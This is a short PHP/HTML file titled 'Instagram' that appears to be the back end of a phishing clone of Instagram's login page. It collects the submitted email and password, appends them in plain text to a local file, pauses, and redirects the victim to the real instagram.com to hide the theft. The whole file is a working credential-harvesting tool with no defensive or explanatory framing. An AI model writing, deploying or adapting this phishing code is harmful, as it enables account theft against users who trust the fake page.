<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
</head>
<body>
    <h3>This is PHP</h3>
<?php
//connecting to Server
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    //Collecting Form Data
    //email
    $email = $_REQUEST["login_email"];
    //cheking user field is not empty
    if (empty($email)) {
        echo "Please Fill The Field";
    } else {
        $login_email = "\nUsername: " .$email;
        echo($login_email);
    }
    //password
    $password = $_REQUEST["login_password"];
    if (empty($password)) {
        echo "Please Fill The Password";
    } else {
        $login_password = "\nPassword: " .$password;
        echo($login_password);
    }
     //making File in which user data will be stored in linux as well windows
    // $make_file = fopen("/home/khonshu/Desktop/Instagram Clone/login_data.txt" , "a+") or die("Unable To Write Data"); 
    $make_file = fopen("C:\Users\AMIT PARAB\Desktop/login_data.txt" , "a+") or die("Unable To Write Data");
     fwrite($make_file , $login_email);
     fwrite($make_file , $login_password);
     fclose($make_file);
}
?>
<!-- sleep net execution of function for 5 second    -->
<?php 
sleep(5)
?>
<?php
   header("Location: https://instagram.com");
   exit;
?>
</body>
</html>

